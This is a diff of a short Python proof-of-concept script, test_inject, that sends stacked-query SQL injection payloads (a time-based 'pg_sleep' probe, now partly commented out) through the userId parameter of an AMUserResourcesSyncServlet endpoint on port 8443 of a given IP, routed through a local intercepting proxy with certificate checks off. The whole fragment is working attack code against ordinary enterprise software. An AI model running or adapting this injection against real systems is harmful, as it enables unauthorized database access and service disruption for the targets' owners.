@@ -13,13 +13,14 @@ def test_inject(ip):
 
     #Target URL is: https://%s//servlet/AMUserResourcesSyncServlet?ForMasRange=&userId=?
     url = "https://%s:8443/servlet/AMUserResourcesSyncServlet" % ip
-    payload = '1;select+pg_sleep(10);'
+    #payload = '1;select+pg_sleep(100);'
+    payload = '1;'
     params = {
                 "ForMasRange":"1",
                 "userId":payload
             }
 
-    proxies = {'http':'http://127.0.0.1:8080'}
+    proxies = {'https':'https://127.0.0.1:8080'}
     r = requests.get(url, params=params, proxies=proxies, verify=False)
     print(r.text)
     print(r.headers)
